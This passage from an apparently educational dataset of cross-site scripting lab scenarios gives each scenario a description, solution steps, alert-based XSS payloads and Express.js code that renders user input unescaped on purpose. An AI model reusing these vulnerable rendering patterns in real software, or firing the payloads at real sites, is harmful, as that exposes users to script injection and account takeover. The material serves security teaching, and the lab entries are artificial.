      "srcCode": "const express = require('express');\nconst app = express();\nlet customText = '';\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/customize', (req, res) => {\n  customText = req.body.text;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`<html><body><div class='shirt'>${customText}</div></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in User Feedback Preview",
      "Lab Description": "The application allows users to preview their feedback before submission. The preview is rendered using innerHTML without sanitization, making it vulnerable to reflected XSS. The feedback text is taken from a query parameter.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Navigate to the feedback preview page with a crafted payload in the URL.",
        "Inject a payload that executes when rendered in the preview section.",
        "Observe alert execution when the preview is loaded."
      ],
      "payloads": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback-preview', (req, res) => {\n  const message = req.query.message || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Feedback Preview</h2>\n        <div id='preview'>${message}</div>\n        <a href='/'>Back</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS via Contact Form Rendering in Admin Panel",
      "Lab Description": "The application stores contact form messages in a database. The admin panel renders these messages without encoding, resulting in stored XSS when a message contains malicious JavaScript.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a contact form with a malicious script as the message.",
        "Log in as admin or trigger an admin to view the message panel.",
        "Confirm that the script executes in the admin panel."
      ],
      "payloads": [
        "<script>alert('admin')</script>",
        "<img src=x onerror=alert('admin')>",
        "<svg/onload=alert('admin')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet messages = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/contact', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form method='POST' action='/contact'>\n          <input name='name'>\n          <textarea name='message'></textarea>\n          <button type='submit'>Send</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/contact', (req, res) => {\n  messages.push(req.body);\n  res.redirect('/contact');\n});\n\napp.get('/admin/messages', (req, res) => {\n  let output = messages.map(m => `<li>${m.message}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Messages</h2>\n        <ul>${output}</ul>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS in Search Suggestion Autocomplete",
      "Lab Description": "The app provides live search suggestions using JavaScript and appends search terms directly to the DOM using innerHTML. If the search term is attacker-controlled, this introduces DOM-based XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject a payload via the search query string.",
        "Observe that the payload is reflected in the DOM as raw HTML.",
        "Trigger the payload to cause script execution."
      ],
      "payloads": [
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const term = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Search</h2>\n        <div id='results'></div>\n        <script>\n          let results = document.getElementById('results');\n          results.innerHTML = 'Suggestions for: ${term}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Blog Comment Section",
      "Lab Description": "Users can leave comments on blog posts. Comments are stored and displayed using innerHTML without sanitization, allowing stored XSS if an attacker injects a malicious script.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a comment containing a JavaScript payload.",
        "Visit the blog post again or have another user view it.",
        "Script execution will occur if vulnerable."
      ],
      "payloads": [
        "<script>alert('blog')</script>",
        "<svg/onload=alert('blog')>",
        "<img src=x onerror=alert('blog')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/blog', (req, res) => {\n  let commentHtml = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>My Blog</h2>\n        ${commentHtml}\n        <form action='/comment' method='POST'>\n          <input name='comment'>\n          <button type='submit'>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/blog');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Error Message Display",
      "Lab Description": "The app includes a debug mode that shows detailed error messages with user input echoed back on failure. The error is printed inside the HTML body using unsanitized user data, leading to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Trigger an error by sending a malformed input with a script payload.",
        "Observe that the payload is rendered in the error message.",
        "Script should execute when error page loads."
      ],
      "payloads": [
        "<script>alert('err')</script>",
        "<img src=x onerror=alert('err')>",
        "<svg/onload=alert('err')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/debug', (req, res) => {\n  const q = req.query.q;\n  if (!q || q.length < 3) {\n    res.send(`\n      <html>\n        <body>\n          <h2>Error</h2>\n          <p>Invalid input: ${q}</p>\n        </body>\n      </html>\n    `);\n  } else {\n    res.send('<p>Valid input received</p>');\n  }\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Profile Settings JSON Reflection",
      "Lab Description": "The app allows users to update their profile settings via a JSON-based endpoint. The server reflects user input into the page using a script block and JSON.parse without escaping. This allows XSS when crafted JSON is interpreted as script.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit a profile update containing a malicious string.",
        "The server reflects the data into a script block inside a JSON object.",
        "Script executes due to improper escaping."
      ],
      "payloads": [
        "\"><script>alert(1)</script>",
        "</script><script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet profile = { bio: 'Welcome!' };\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <script>\n          const profile = JSON.parse('{\"bio\":\"${profile.bio}\"}');\n          document.write('<p>' + profile.bio + '</p>');\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/profile-update', (req, res) => {\n  profile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Custom Status Messages",
      "Lab Description": "Users can set a custom status message. The message is displayed in their profile and stored server-side. When other users visit the profile, the unsanitized message renders as HTML, enabling stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set your custom status with a JavaScript payload.",
        "Visit your profile page or another user\u00e2\u20ac\u2122s profile page where the message appears.",
        "Observe script execution."
      ],
      "payloads": [
        "<script>alert('status')</script>",
        "<img src=x onerror=alert('status')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet status = '';\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>Status: ${status}</p>\n        <form method='POST' action='/status'>\n          <input name='status'>\n          <button type='submit'>Update</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/status', (req, res) => {\n  status = req.body.status;\n  res.redirect('/profile');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Notification Popup via Query Parameter",
      "Lab Description": "The app shows a welcome notification popup if a `msg` parameter is passed in the URL. The message is injected into the DOM using innerHTML, allowing reflected XSS via the query string.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the homepage with a crafted `msg` parameter containing a script.",
        "Observe that the payload is injected into a notification popup.",
        "Payload should execute when page loads."
      ],
      "payloads": [
        "<script>alert('notif')</script>",
        "<svg/onload=alert('notif')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const msg = req.query.msg || '';\n  res.send(`\n    <html>\n      <body>\n        <div id='popup'></div>\n        <script>\n          document.getElementById('popup').innerHTML = '${msg}';\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS via Username in Public Posts",
      "Lab Description": "Users can publish short posts under their usernames. The app displays the posts along with the username, but does not sanitize it, allowing stored XSS via username injection.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Register a new user with a malicious payload as the username.",
        "Create a post and view the public timeline.",
        "Script executes as part of the username."
      ],
      "payloads": [
        "<img src=x onerror=alert('user')>",
        "<script>alert('user')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet posts = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/timeline', (req, res) => {\n  const feed = posts.map(p => `<li><strong>${p.user}:</strong> ${p.text}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <ul>${feed}</ul>\n        <form method='POST' action='/post'>\n          <input name='user'>\n          <input name='text'>\n          <button type='submit'>Post</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/post', (req, res) => {\n  posts.push({ user: req.body.user, text: req.body.text });\n  res.redirect('/timeline');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM-based XSS via Hash Fragment Injection",
      "Lab Description": "The app reads the `location.hash` value and writes it directly into the DOM using innerHTML to simulate tab switching. An attacker can craft a malicious link with a script in the hash fragment.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Craft a URL with a script payload inside the hash fragment.",
        "Send the link to a victim or open it in the browser.",
        "Observe script execution from the hash value."
      ],
      "payloads": [
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='tab'></div>\n        <script>\n          const tab = location.hash.substring(1);\n          document.getElementById('tab').innerHTML = tab;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS via Error Message in Email Reset",
      "Lab Description": "The app includes an email reset form that returns an error message if the email is invalid. The error is reflected in the page without proper encoding, leading to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit an invalid email that includes a script tag.",
        "The error message will include the email you entered.",
        "Script executes in the error message block."
      ],
      "payloads": [
        "<script>alert('email')</script>",
        "<img src=x onerror=alert('email')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/reset', (req, res) => {\n  const error = req.query.error || '';\n  res.send(`\n    <html>\n      <body>\n        <form method='POST' action='/reset'>\n          <input name='email'>\n          <button type='submit'>Reset Password</button>\n        </form>\n        <div>${error}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/reset', (req, res) => {\n  const email = req.body.email;\n  if (!email.includes('@')) {\n    res.redirect(`/reset?error=Invalid email: ${email}`);\n  } else {\n    res.redirect('/reset');\n  }\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Event Title on Calendar App",
      "Lab Description": "A calendar app allows users to add events with a title and description. The event title is displayed without sanitization, making the app vulnerable to stored XSS when a malicious title is entered.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create an event with a payload as the title.",
        "View the calendar where the event title is displayed.",
        "Payload triggers script execution."
      ],
      "payloads": [
        "<script>alert('calendar')</script>",
        "<img src=x onerror=alert('calendar')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet events = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/calendar', (req, res) => {\n  const list = events.map(e => `<li>${e.title}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <ul>${list}</ul>\n        <form method='POST' action='/event'>\n          <input name='title'>\n          <input name='desc'>\n          <button type='submit'>Add Event</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/event', (req, res) => {\n  events.push({ title: req.body.title, desc: req.body.desc });\n  res.redirect('/calendar');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Search Suggestion Rendering",
      "Lab Description": "As users type into the search bar, the app fetches and renders suggestions directly from the server. Suggestions are injected using innerHTML, leading to DOM-based XSS when malicious entries are returned.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger a suggestion request with a malicious input.",
        "Server reflects the input as one of the suggestions.",
        "Frontend renders suggestions with innerHTML, executing script."
      ],
      "payloads": [
        "<img src=x onerror=alert('suggest')>",
        "<script>alert('suggest')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/suggest', (req, res) => {\n  const q = req.query.q || '';\n  const suggestions = [`<li>${q}</li>`];\n  res.send(suggestions.join(''));\n});\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <input id='search'>\n        <ul id='results'></ul>\n        <script>\n          const input = document.getElementById('search');\n          input.addEventListener('input', async () => {\n            const res = await fetch('/suggest?q=' + input.value);\n            const text = await res.text();\n            document.getElementById('results').innerHTML = text;\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Forum Search Results",
      "Lab Description": "A forum application includes a search page that displays the search query as part of the results heading. The query is injected directly into the HTML without encoding, allowing reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Navigate to the search page with a malicious query string.",
        "The query is reflected into a heading element.",
        "Script executes upon loading the results page."
      ],
      "payloads": [
        "<svg/onload=alert('search')>",
        "<script>alert('search')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Results for: ${q}</h2>\n        <form>\n          <input name='q'>\n          <button type='submit'>Search</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS via Feedback Widget",
      "Lab Description": "Users can leave feedback using a widget that displays the most recent comments on the homepage. The app fails to sanitize input before rendering, leading to persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit feedback with a script payload.",
        "Reload the homepage to see the feedback appear.",
        "Payload is executed as part of the page render."
      ],
      "payloads": [
        "<script>alert('feedback')</script>",
        "<img src=x onerror=alert('feedback')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedback = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/', (req, res) => {\n  const entries = feedback.map(f => `<p>${f}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        ${entries}\n        <form method='POST' action='/feedback'>\n          <input name='text'>\n          <button type='submit'>Submit Feedback</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/feedback', (req, res) => {\n  feedback.push(req.body.text);\n  res.redirect('/');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS in Chat Mention Highlighting",
      "Lab Description": "A real-time chat application highlights mentions (e.g., @username) by wrapping them with a span. The replacement is done using innerHTML without escaping, which can lead to DOM-based XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a message containing a crafted payload designed to look like a mention.",
        "The frontend processes and wraps mentions using innerHTML.",
        "Payload executes when viewed by others."
      ],
      "payloads": [
        "@<img src=x onerror=alert('mention')>",
        "@<svg onload=alert('mention')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nlet messages = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/chat', (req, res) => {\n  const list = messages.map(m => `<div>${m}</div>`).join('');\n  res.send(`\n    <html>\n      <body>\n        ${list}\n        <form action='/send' method='POST'>\n          <input name='msg'>\n          <button>Send</button>\n        </form>\n        <script>\n          const divs = document.querySelectorAll('div');\n          divs.forEach(d => {\n            d.innerHTML = d.innerHTML.replace(/@(\\w+)/g, '<span class=\"mention\">@$1</span>');\n          });\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/send', (req, res) => {\n  messages.push(req.body.msg);\n  res.redirect('/chat');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in User Badge Label",
      "Lab Description": "The platform lets users set a badge label that appears next to their name. The label is rendered without output encoding, which leads to stored XSS when a malicious label is saved.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Change your profile badge to include a script payload.",
        "Visit a page where your badge is shown next to your name.",
        "Script executes in the profile viewer\u00e2\u20ac\u2122s browser."
      ],
      "payloads": [
        "<script>alert('badge')</script>",
        "<img src=x onerror=alert('badge')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet users = {};\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile/:user', (req, res) => {\n  const user = req.params.user;\n  const badge = users[user] || 'None';\n  res.send(`\n    <html>\n      <body>\n        <h2>${user} <span>${badge}</span></h2>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/setbadge', (req, res) => {\n  users[req.body.user] = req.body.badge;\n  res.redirect('/profile/' + req.body.user);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS via Invite Link Preview",
      "Lab Description": "The app lets users send invite links with custom messages. The message is reflected in the invite preview without encoding, which leads to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Craft an invite URL with a message parameter containing script.",
        "Open the link and observe the message rendered on the page.",
        "Script executes in the preview area."
      ],
      "payloads": [
        "<script>alert('invite')</script>",
        "<img src=x onerror=alert('invite')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/invite', (req, res) => {\n  const msg = req.query.msg || '';\n  res.send(`\n    <html>\n      <body>\n        <h3>You were invited!</h3>\n        <p>${msg}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS via Public Link Description",
      "Lab Description": "Users can share public links with descriptions. These are displayed in a shared gallery. The description field is vulnerable to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a new public link with a script payload as the description.",
        "Visit the shared links gallery page.",
        "Script executes in the context of every viewer."
      ],
      "payloads": [
        "<script>alert('shared')</script>",
        "<svg onload=alert('shared')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet links = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/gallery', (req, res) => {\n  const out = links.map(l => `<li>${l.desc}</li>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <ul>${out}</ul>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  links.push({ url: req.body.url, desc: req.body.desc });\n  res.redirect('/gallery');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Document Viewer Page Name",
      "Lab Description": "A document viewer allows previewing documents with a custom page name set via a query parameter. The page name is used in a heading without sanitization, enabling reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Send a GET request with the 'title' parameter including a payload.",
        "Observe the reflected unsanitized content in the heading.",
        "Payload is executed immediately."
      ],
      "payloads": [
        "<script>alert('doc')</script>",
        "<img src=x onerror=alert('doc')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/view', (req, res) => {\n  const title = req.query.title || 'Document';\n  res.send(`\n    <html>\n      <body>\n        <h1>${title}</h1>\n        <p>Document content goes here...</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via Hash-Based Router in Single Page App",
      "Lab Description": "The application uses a hash-based router to load views in a single-page application. The router reads `window.location.hash` and uses `innerHTML` to insert dynamic content, allowing for DOM-based XSS via crafted URL fragments.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft a URL with a malicious script payload in the hash portion (after #).",
        "Load the URL in the browser and trigger SPA route handling.",
        "Script executes when inserted into the DOM."
      ],
      "payloads": [
        "#<img src=x onerror=alert('spa')>",
        "#<svg onload=alert('spa')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <div id='view'></div>\n        <script>\n          const frag = location.hash.slice(1);\n          document.getElementById('view').innerHTML = frag;\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS via Product FAQ Answer Field",
      "Lab Description": "Users can submit FAQs for products. The answer field is stored and later rendered without escaping. This allows persistent XSS via the answer field.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a FAQ answer that includes script payloads.",
        "Visit the product page where FAQs are shown.",
        "Script executes in any visitor\u00e2\u20ac\u2122s browser."
      ],
      "payloads": [
        "<script>alert('faq')</script>",
        "<img src=x onerror=alert('faq')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet faqs = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product', (req, res) => {\n  const faqHtml = faqs.map(f => `<dt>${f.q}</dt><dd>${f.a}</dd>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>FAQs</h2>\n        <dl>${faqHtml}</dl>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/faq', (req, res) => {\n  faqs.push({ q: req.body.q, a: req.body.a });\n  res.redirect('/product');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Order Confirmation Message",
      "Lab Description": "After placing an order, the app displays a custom message using a `msg` query parameter. This parameter is reflected without escaping, leading to reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Craft a URL with a `msg` parameter containing a script payload.",
        "Load the page and observe execution in the confirmation message.",
        "Verify that the payload runs."
      ],
      "payloads": [
        "<script>alert('confirm')</script>",
        "<svg onload=alert('confirm')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/thankyou', (req, res) => {\n  const msg = req.query.msg || 'Thank you for your purchase!';\n  res.send(`\n    <html>\n      <body>\n        <h3>${msg}</h3>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS via Email Signature Setting",
      "Lab Description": "Users can customize an email signature that appears on every message they send. The signature is rendered as HTML without sanitization, allowing persistent XSS.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Set your email signature to a script-based payload.",
        "Send a message; the recipient will receive it with your signature rendered.",
        "Script executes when email is viewed."
      ],
      "payloads": [
        "<script>alert('signature')</script>",
        "<img src=x onerror=alert('signature')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet signatures = {};\nlet messages = [];\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/inbox/:user', (req, res) => {\n  const inbox = messages.filter(m => m.to === req.params.user);\n  const view = inbox.map(m => `<div><strong>${m.from}:</strong><p>${m.body}</p><p>${m.sig}</p></div>`).join('');\n  res.send(`<html><body>${view}</body></html>`);\n});\n\napp.post('/setsig', (req, res) => {\n  signatures[req.body.user] = req.body.sig;\n  res.redirect('/inbox/' + req.body.user);\n});\n\napp.post('/send', (req, res) => {\n  messages.push({\n    from: req.body.from,\n    to: req.body.to,\n    body: req.body.body,\n    sig: signatures[req.body.from] || ''\n  });\n  res.redirect('/inbox/' + req.body.to);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in JSONP Callback Parameter",
      "Lab Description": "An endpoint supports JSONP responses using a `callback` parameter. The callback name is not validated or sanitized, allowing XSS if script tags are injected.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send a request to `/api?callback=<script>` or similar payload.",
        "Observe the response and execution of JavaScript from the crafted callback.",
        "Payload executes in browser if endpoint is loaded in `<script src>`."
      ],
      "payloads": [
        "<script>alert('jsonp')</script>",
        "alert('jsonp')"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api', (req, res) => {\n  const callback = req.query.callback || 'callback';\n  const data = JSON.stringify({ msg: 'hello' });\n  res.set('Content-Type', 'application/javascript');\n  res.send(`${callback}(${data})`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in User-Generated Calendar Event Titles",
      "Lab Description": "The web calendar allows users to add events with custom titles and descriptions. Titles are rendered on the main calendar interface without sanitization, enabling persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a new calendar event with a title that includes an XSS payload.",
        "Visit the calendar homepage where the event titles are listed.",
        "The script executes when the calendar renders the malicious event."
      ],
      "payloads": [
        "<script>alert('calendar')</script>",
        "<img src=x onerror=alert('calendar')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet events = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/calendar', (req, res) => {\n  const eventList = events.map(e => `<li>${e.title}</li>`).join('');\n  res.send(`<html><body><ul>${eventList}</ul><form action='/addevent' method='POST'><input name='title'><button>Add</button></form></body></html>`);\n});\n\napp.post('/addevent', (req, res) => {\n  events.push({ title: req.body.title });\n  res.redirect('/calendar');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Reflected XSS in Feedback Search Query",
      "Lab Description": "The feedback search feature reflects the user query directly into the results page title without proper escaping, allowing reflected XSS through the query string.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Send a search request with a script in the query parameter.",
        "Observe the reflected payload executing in the page response."
      ],
      "payloads": [
        "<script>alert('feedback')</script>",
        "<svg/onload=alert('feedback')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/feedback', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<html><body><h3>Results for: ${q}</h3></body></html>`);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in User-Supplied Video Titles",
      "Lab Description": "The video sharing platform allows users to upload videos and provide a title. These titles are rendered in the homepage feed without escaping, enabling persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a new video with a malicious title containing script tags.",
        "Open the homepage feed to trigger script execution."
      ],
      "payloads": [
        "<script>alert('video')</script>",
        "<img src=x onerror=alert('video')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet videos = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/home', (req, res) => {\n  const list = videos.map(v => `<li>${v.title}</li>`).join('');\n  res.send(`<html><body><ul>${list}</ul><form action='/upload' method='POST'><input name='title'><button>Upload</button></form></body></html>`);\n});\n\napp.post('/upload', (req, res) => {\n  videos.push({ title: req.body.title });\n  res.redirect('/home');\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "DOM XSS via URL Fragment Injection in Dynamic Viewer",
      "Lab Description": "A dynamic viewer loads content based on the `window.location.hash` and directly injects it into the DOM. This leads to a DOM-based XSS vulnerability via the URL fragment.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft a URL with a malicious script in the fragment portion.",
        "Load the page to trigger DOM XSS."
      ],
      "payloads": [
        "#<img src=x onerror=alert('dom')>",
        "#<svg/onload=alert('dom')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html><body>\n      <div id='viewer'></div>\n      <script>\n        const frag = location.hash.slice(1);\n        document.getElementById('viewer').innerHTML = frag;\n      </script>\n    </body></html>\n  `);\n});\n\napp.listen(3000);"
    },
    {
      "Lab scenario": "Stored XSS in Poll Option Text",
      "Lab Description": "Users can create polls and define custom options. Option text is rendered into a voting form without escaping, making the app vulnerable to stored XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a poll with a malicious option payload.",
        "Load the poll voting page and trigger script execution."
      ],
      "payloads": [
        "<script>alert('poll')</script>",
        "<img src=x onerror=alert('poll')>"
      ],
      "Vulnerability name": "Cross-site scripting",
